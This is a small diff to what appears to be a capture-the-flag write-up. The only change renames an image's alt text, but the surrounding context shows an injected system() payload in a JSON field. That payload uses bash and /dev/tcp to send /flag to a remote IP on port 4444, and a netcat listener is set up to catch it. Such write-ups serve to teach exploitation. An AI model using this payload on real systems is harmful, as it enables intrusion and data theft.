@@ -202,7 +202,7 @@ Connection: keep-aliave
 {"signal":"Arrival","logogram":"system(\"bash -c 'cat /flag >& /dev/tcp/156.238.233.93/4444 0>&1'\");"}
 ```
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
 ```bash
 root@dkhkKySag1YyfK:~# nc -lvnp 4444
